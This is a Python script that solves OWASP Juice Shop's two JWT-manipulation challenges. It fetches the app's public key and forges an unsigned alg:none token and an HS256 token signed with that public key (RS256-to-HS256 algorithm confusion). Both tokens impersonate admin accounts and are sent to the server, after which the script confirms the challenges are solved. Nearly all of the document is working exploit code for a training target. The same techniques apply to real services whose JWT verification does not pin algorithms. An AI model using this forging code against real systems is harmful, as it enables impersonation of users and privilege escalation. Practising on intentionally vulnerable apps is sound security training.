#!/usr/bin/env python3
"""
JWT forging helper for OWASP Juice Shop's two JWT-manipulation challenges.

Root cause: Juice Shop calls `jwt.verify(token, publicKey, cb)` WITHOUT pinning an
`algorithms` whitelist (lib/insecurity.ts), so the verifier accepts:
  1. alg:none  -> "Unsigned JWT" challenge (impersonate jwtn3d@juice-sh.op)
  2. alg:HS256 signed with the *public key* as the HMAC secret -> "Forged Signed JWT"
     challenge (RS256->HS256 algorithm confusion, impersonate rsa_lord@juice-sh.op)

The public key is downloadable at /encryptionkeys/jwt.pub with no auth.

The solver middleware verify.jwtChallenges() runs on every request, so simply
sending each forged token in the Authorization header solves the challenge.

Usage: python3 jwt_forge.py [http://localhost:3000]
Prints "RESULT: JWT MANIPULATION CONFIRMED" when a forged token is accepted.
Uses only the Python standard library (no external dependencies).
"""

from __future__ import annotations

import sys
import json
import base64
import hmac
import hashlib
import urllib.request

BASE = (sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:3000")


def _get(path: str, token: str | None = None) -> str:
    req = urllib.request.Request(BASE + path)
    if token:
        req.add_header("Authorization", "Bearer " + token)
    return urllib.request.urlopen(req, timeout=15).read().decode()


def _b64(d: bytes) -> bytes:
    return base64.urlsafe_b64encode(d).rstrip(b"=")


def _seg(header: dict, payload: dict) -> bytes:
    return (
        _b64(json.dumps(header, separators=(",", ":")).encode())
        + b"."
        + _b64(json.dumps(payload, separators=(",", ":")).encode())
    )


def _payload(email: str) -> dict:
    return {"status": "success", "data": {"id": 1, "email": email, "role": "admin"}, "iat": 1781979387}


def main() -> int:
    # 1) Fetch the public key the same way an unauthenticated attacker would.
    pub = _get("/encryptionkeys/jwt.pub")

    # 2) Forge an unsigned (alg:none) token impersonating jwtn3d@juice-sh.op.
    none_tok = (_seg({"typ": "JWT", "alg": "none"}, _payload("jwtn3d@juice-sh.op")) + b".").decode()

    # 3) Forge an HS256 token signed with the PUBLIC KEY as the HMAC secret
    #    (RS256 -> HS256 algorithm confusion) impersonating rsa_lord@juice-sh.op.
    s = _seg({"typ": "JWT", "alg": "HS256"}, _payload("rsa_lord@juice-sh.op"))
    hs_tok = (s + b"." + _b64(hmac.new(pub.encode(), s, hashlib.sha256).digest())).decode()

    # 4) Send each forged token; verify.jwtChallenges() inspects every request.
    for tok in (none_tok, hs_tok):
        try:
            _get("/rest/products/search?q=x", token=tok)
        except Exception:
            pass

    # 5) Confirm by reading the challenge solve status.
    cs = json.loads(_get("/api/Challenges/"))["data"]
    status = {c["key"]: c["solved"] for c in cs if c["key"] in ("jwtUnsignedChallenge", "jwtForgedChallenge")}

    print("alg:none token (jwtn3d@)   :", none_tok)
    print("HS256 token (rsa_lord@)    :", hs_tok)
    print("CHALLENGE STATUS           :", json.dumps(status))
    print("RESULT:", "JWT MANIPULATION CONFIRMED" if any(status.values()) else "NOT CONFIRMED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
